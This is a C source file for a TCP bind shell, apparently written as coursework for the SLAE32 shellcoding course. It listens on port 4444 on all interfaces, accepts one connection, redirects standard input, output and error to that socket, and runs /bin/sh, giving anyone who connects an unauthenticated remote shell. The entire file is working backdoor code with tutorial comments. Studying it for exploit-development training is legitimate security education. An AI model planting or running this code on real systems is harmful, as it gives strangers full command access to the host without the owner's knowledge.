// Shell_bind_tcp
// For SLAE32
// Howard McGreehan
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <stdio.h>
int main(void)
{
        // Create a struct for the server's listen address
        struct sockaddr_in srv_addr;

        // As seen in https://www.man7.org/linux/man-pages/man7/ip.7.html, 
        // Set the socket 'family' to AF_INET
        // Set the sin_port value to the port number, in network byte order
        // Set the s_addr valut to INADDR_ANY, for IP agnostic bind()
        srv_addr.sin_family = AF_INET;  
        srv_addr.sin_port = htons(4444);
        srv_addr.sin_addr.s_addr = INADDR_ANY;
        
	// The, create the socket!      
        int socketfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
        
	// Now, we need to bind things together
        bind( socketfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
        
	// Next, we set the socket to 'listen', and apply a 'backlog' argument to 0
        listen( socketfd, 0 );
        
	// Once set to listen, we need to tell the listening socket to accept connections
        int newSocket = accept(socketfd, NULL, NULL);
        
	// Set up dup2 for stdin/out/err
        dup2(newSocket, 0);
        dup2(newSocket, 1);
        dup2(newSocket, 2);
        
	// Lastly, we execute /bin/sh via execve
        execve( "/bin/sh", NULL, NULL );
}
